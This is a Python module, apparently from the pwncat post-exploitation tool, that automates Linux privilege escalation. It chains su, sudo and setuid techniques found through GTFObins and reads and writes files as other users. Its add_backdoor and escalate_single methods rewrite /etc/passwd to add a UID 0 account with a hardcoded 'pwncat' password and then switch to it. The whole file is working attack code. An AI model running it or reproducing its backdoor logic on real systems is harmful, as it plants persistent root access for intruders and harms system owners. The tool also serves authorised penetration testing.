#!/usr/bin/env python3
from typing import Type, List, Tuple
import crypt

from pwncat.privesc.base import Method, PrivescError, Technique, SuMethod, Capability
from pwncat.privesc.setuid import SetuidMethod
from pwncat.privesc.sudo import SudoMethod
from pwncat import downloader
from pwncat import gtfobins
from pwncat import util


# privesc_methods = [SetuidMethod, SuMethod]
privesc_methods = [SuMethod, SudoMethod, SetuidMethod]


class Finder:
    """ Locate a privesc chain which ends with the given user. If `depth` is
    supplied, stop searching at `depth` techniques. If `depth` is not supplied
    or is negative, search until all techniques are exhausted or a chain is
    found. If `user` is not provided, depth is forced to `1`, and all methods
    to privesc to that user are returned. """

    DEFAULT_BACKDOOR_NAME = "pwncat"
    DEFAULT_BACKDOOR_PASS = "pwncat"

    def __init__(
        self,
        pty: "pwncat.pty.PtyHandler",
        backdoor_user: str = None,
        backdoor_password: str = None,
    ):
        """ Create a new privesc finder """

        self.pty = pty
        # A user we added which has UID=0 privileges
        self.backdoor_user = None
        self.backdoor_user_name = backdoor_user
        self.backdoor_password = backdoor_password
        self.methods: List[Method] = []
        for m in privesc_methods:
            try:
                m.check(self.pty)
                self.methods.append(m(self.pty))
            except PrivescError:
                pass

        if backdoor_user is None:
            self.backdoor_user_name = Finder.DEFAULT_BACKDOOR_NAME
        if backdoor_password is None:
            self.backdoor_password = Finder.DEFAULT_BACKDOOR_PASS

        if self.backdoor_user_name in self.pty.users:
            self.pty.users[self.backdoor_user_name]["password"] = self.backdoor_password
            self.backdoor_user = self.pty.users[self.backdoor_user_name]

    def search(self, target_user: str = None) -> List[Technique]:
        """ Search for privesc techniques for the current user to get to the
        target user. If target_user is not specified, all techniques for all
        users will be returned. """

        techniques = []
        for method in self.methods:
            try:
                techniques.extend(method.enumerate())
            except PrivescError:
                pass

        if target_user is not None:
            techniques = [
                technique for technique in techniques if technique.user == target_user
            ]

        return techniques

    def add_backdoor(self):
        """ Add the backdoor user if it doesn't already exist. This is normally
        called in order to solidify full UID=0 access (e.g. when SUID binaries
        yield a EUID=0 but UID!=0. """

        self.pty.reload_users()

        if self.backdoor_user_name not in self.pty.users:
            binary = gtfobins.Binary.find_capability(self.pty.which, Capability.READ)
            if binary is None:
                raise PrivescError("no file read methods available from gtfobins")

            # Read the etc/passwd file
            passwd = self.pty.subprocess(binary.read_file("/etc/passwd"))
            data = passwd.read()
            passwd.close()

            # Split up the file by lines
            data = data.decode("utf-8").strip()
            data = data.split("\n")

            # Add a new user
            password = crypt.crypt(self.backdoor_password)
            user = self.backdoor_user_name
            data.append(f"{user}:{password}:0:0::/root:{self.pty.shell}")

            # Prepare data for transmission
            data = ("\n".join(data) + "\n").encode("utf-8")

            # Find a GTFObins payload that works
            binary = gtfobins.Binary.find_capability(self.pty.which, Capability.WRITE)
            if binary is None:
                raise PrivescError("no file write methods available from gtfobins")

            # Write the file
            self.pty.run(binary.write_file("/etc/passwd", data))

            # Stabilize output after the file write
            self.pty.run("echo")

            # Reload the /etc/passwd data
            self.pty.reload_users()

            if self.backdoor_user_name not in self.pty.users:
                raise PrivescError("/etc/passwd update failed!")

        self.pty.process(f"su {self.backdoor_user_name}", delim=False)
        self.pty.client.send(self.backdoor_password.encode("utf-8") + b"\n")
        self.pty.run("echo")

    def write_file(
        self,
        filename: str,
        data: bytes,
        safe: bool = True,
        target_user: str = None,
        depth: int = None,
        chain: List[Technique] = [],
        starting_user=None,
    ):

        if target_user is None:
            target_user = "root"

        current_user = self.pty.current_user
        if (
            target_user == current_user["name"]
            or current_user["uid"] == 0
            or current_user["name"] == "root"
        ):
            binary = gtfobins.Binary.find_capability(
                self.pty.which, Capability.WRITE, safe=safe
            )
            if binary is None:
                raise PrivescError("no binaries to write with")

            return self.pty.subprocess(binary.write_file(filename, data)), chain

        if starting_user is None:
            starting_user = current_user

        if depth is not None and len(chain) > depth:
            raise PrivescError("max depth reached")

        # Enumerate escalation options for this user
        techniques = []
        for method in self.methods:
            try:
                found_techniques = method.enumerate(capability=Capability.ALL)
                for tech in found_techniques:

                    if tech.user == target_user and (
                        tech.capabilities & Capability.WRITE
                    ):
                        try:
                            tech.method.write_file(filename, data, tech)
                            return chain
                        except PrivescError as e:
                            pass
                techniques.extend(found_techniques)
            except PrivescError:
                pass

        # We can't escalate directly to the target to read a file. So, try recursively
        # against other users.
        for tech in techniques:
            if tech.user == target_user:
                continue
            try:
                exit_command = self.escalate_single(tech)
                chain.append((tech, exit_command))
            except PrivescError:
                continue
            try:
                return self.write_file(
                    filename, data, safe, target_user, depth, chain, starting_user
                )
            except PrivescError:
                tech, exit_command = chain[-1]
                self.pty.run(exit_command, wait=False)
                chain.pop()

        raise PrivescError(f"no route to {target_user} found")

    def read_file(
        self,
        filename: str,
        target_user: str = None,
        depth: int = None,
        chain: List[Technique] = [],
        starting_user=None,
    ):

        if target_user is None:
            target_user = "root"

        current_user = self.pty.current_user
        if (
            target_user == current_user["name"]
            or current_user["uid"] == 0
            or current_user["name"] == "root"
        ):
            binary = gtfobins.Binary.find_capability(self.pty.which, Capability.READ)
            if binary is None:
                raise PrivescError("no binaries to read with")

            return self.pty.subprocess(binary.read_file(filename)), chain

        if starting_user is None:
            starting_user = current_user

        if depth is not None and len(chain) > depth:
            raise PrivescError("max depth reached")

        # Enumerate escalation options for this user
        techniques = []
        for method in self.methods:
            try:
                found_techniques = method.enumerate(capability=Capability.ALL)
                for tech in found_techniques:
                    if tech.user == target_user and (
                        tech.capabilities & Capability.READ
                    ):
                        try:
                            read_pipe = tech.method.read_file(filename, tech)

                            return (read_pipe, chain)
                        except PrivescError as e:
                            pass
                techniques.extend(found_techniques)
            except PrivescError:
                pass

        # We can't escalate directly to the target to read a file. So, try recursively
        # against other users.
        for tech in techniques:
            if tech.user == target_user:
                continue
            try:
                exit_command = self.escalate_single(tech)
                chain.append((tech, exit_command))
            except PrivescError:
                continue
            try:
                return self.read_file(
                    filename, target_user, depth, chain, starting_user
                )
            except PrivescError:
                tech, exit_command = chain[-1]
                self.pty.run(exit_command, wait=False)
                chain.pop()

        raise PrivescError(f"no route to {target_user} found")

    def escalate_single(self, technique: Technique) -> str:

        util.progress(f"attempting escalation to {technique}")

        if (technique.capabilities & Capability.SHELL) > 0:
            try:
                # Attempt our basic, known technique
                return technique.method.execute(technique)
            except PrivescError:
                pass

        # We can't privilege escalate with this technique, but we may be able
        # to add a user via file write.
        if (technique.capabilities & Capability.WRITE) == 0 or technique.user != "root":
            raise PrivescError("privesc failed")

        # We need su to privesc w/ file write
        if self.pty.which("su") is None:
            raise PrivescError("privesc failed")

        # Read the current content of /etc/passwd
        reader = gtfobins.Binary.find_capability(self.pty.which, Capability.READ)
        if reader is None:
            print("\nNo reader found")
            raise PrivescError("no file reader found")

        payload = reader.read_file("/etc/passwd")

        # Read the file
        passwd = self.pty.subprocess(reader.read_file("/etc/passwd"))
        data = passwd.read()
        passwd.close()

        # Split up the file by lines
        data = data.decode("utf-8").strip()
        data = data.split("\n")

        # Add a new user
        password = crypt.crypt(self.backdoor_password)
        user = self.backdoor_user_name
        data.append(f"{user}:{password}:0:0::/root:{self.pty.shell}")

        # Join the data back and encode it
        data = ("\n".join(data) + "\n").encode("utf-8")

        # Write the data
        technique.method.write_file("/etc/passwd", data, technique)

        # Maybe help?
        self.pty.run("echo")

        # Check that it succeeded
        users = self.pty.reload_users()

        # Check if the new passwd file contained the file
        if user not in users:
            raise PrivescError("privesc failed")

        self.pty.users[user]["password"] = password
        self.backdoor_user = self.pty.users[user]

        # Switch to the new user
        self.pty.process(f"su {user}", delim=False)
        self.pty.client.send(self.backdoor_password.encode("utf-8") + b"\n")
        self.pty.run("echo")

        return "exit"

    def escalate(
        self,
        target_user: str = None,
        depth: int = None,
        chain: List[Technique] = [],
        starting_user=None,
    ) -> List[Tuple[Technique, str]]:
        """ Search for a technique chain which will gain access as the given 
        user. """

        if target_user is None:
            target_user = "root"

        if target_user == "root" and self.backdoor_user:
            target_user = self.backdoor_user["name"]

        current_user = self.pty.current_user
        if (
            target_user == current_user["name"]
            or current_user["uid"] == 0
            or current_user["name"] == "root"
        ):
            raise PrivescError(f"you are already {current_user['name']}")

        if starting_user is None:
            starting_user = current_user

        if depth is not None and len(chain) > depth:
            raise PrivescError("max depth reached")

        # Enumerate escalation options for this user
        techniques = []
        for method in self.methods:
            try:
                util.progress(f"evaluating {method} method")
                found_techniques = method.enumerate(
                    capability=Capability.SHELL | Capability.SUDO | Capability.WRITE
                )
                for tech in found_techniques:
                    if tech.user == target_user:
                        try:
                            util.progress(f"evaluating {tech}")
                            exit_command = self.escalate_single(
                                tech
                            )  # tech.method.execute(tech)
                            chain.append((tech, exit_command))
                            return chain
                        except PrivescError:
                            pass
                techniques.extend(found_techniques)
            except PrivescError:
                pass

        # We can't escalate directly to the target. Instead, try recursively
        # against other users.
        for tech in techniques:
            if tech.user == target_user:
                continue
            if self.in_chain(tech.user, chain):
                continue
            try:
                exit_command = self.escalate_single(tech)  # tech.method.execute(tech)
                chain.append((tech, exit_command))
            except PrivescError:
                continue
            try:
                return self.escalate(target_user, depth, chain, starting_user)
            except PrivescError:
                tech, exit_command = chain[-1]
                self.pty.run(exit_command, wait=False)
                chain.pop()

        raise PrivescError(f"no route to {target_user} found")

    def in_chain(self, user: str, chain: List[Tuple[Technique, str]]) -> bool:
        """ Check if the given user is in the chain """
        for link in chain:
            if link[0].user == user:
                return True
        return False

    def unwrap(self, techniques: List[Tuple[Technique, str]]):
        # Work backwards to get back to the original shell
        for technique, exit in reversed(techniques):
            self.pty.run(exit, wait=False)

        # Reset the terminal to get to a sane prompt
        self.pty.reset()
